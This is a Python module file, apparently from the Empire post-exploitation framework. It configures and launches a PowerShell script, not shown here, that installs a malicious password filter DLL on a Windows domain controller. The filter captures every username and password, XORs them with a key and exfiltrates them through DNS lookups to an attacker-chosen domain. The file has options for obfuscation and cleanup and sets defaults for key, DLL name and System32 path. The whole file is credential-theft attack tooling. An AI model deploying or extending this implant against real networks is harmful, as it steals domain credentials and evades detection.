from lib.common import helpers
import base64


class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
		
            'Name': 'Invoke-PasswordFilterImplant',


            'Author': ['@Le-non', '@DorethZ10'],


            'Description': ('Installs a malicious password filter (x64 ONLY) on the DC that performs username and password exfiltration via DNS. The data is exfiltrated in the format requestnumber.data.domain.com. The data is the hex result of "username:password" XORed with the key. Note: this module will only work on x64 systems.'),


            'Background': False,


            'OutputExtension': None,


            'NeedsAdmin': True,


            'OpsecSafe': False,


            'Language': 'powershell',


            'MinLanguageVersion': '2',

        }


        self.options = {

		'Agent': {
                'Description':   'Agent to run the module on.',
                'Required'   :   True,
                'Value'      :   ''
            },
 		'KeyValue': {
                'Description'   :   'Encrypting key for the passwords',
                'Required'      :   True,
                'Value'         :   '31337'
            },
        'DomainValue' : {
                'Description'   :   'DNS Domain to exfill the data. MUST start with a \'.\'',
                'Required'      :   True,
                'Value'         :   '.example.com'
            },
		'DllName' : {
                'Description'   :   'File name of the password filter. (Excluding the ".dll" file extension)',
                'Required'      :   True,
                'Value'         :   'DLLPasswordFilterImplant'
            },	
		'DllPath' : {
                'Description'   :   'Path to the System32 folder of the target',
                'Required'      :   True,
                'Value'         :   'C:\Windows\System32'
            },	
		'Cleanup' : {
                'Description'   :   'Cleanup the trigger and any script from specified location. Note: the DLL will stay on the disk. The registry keys will be cleared so it won\'t load  anymore.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-PasswordFilterImplant.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

		script = moduleCode

        # Need to actually run the module that has been loaded
        scriptEnd = 'Invoke-PasswordFilterImplant'

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
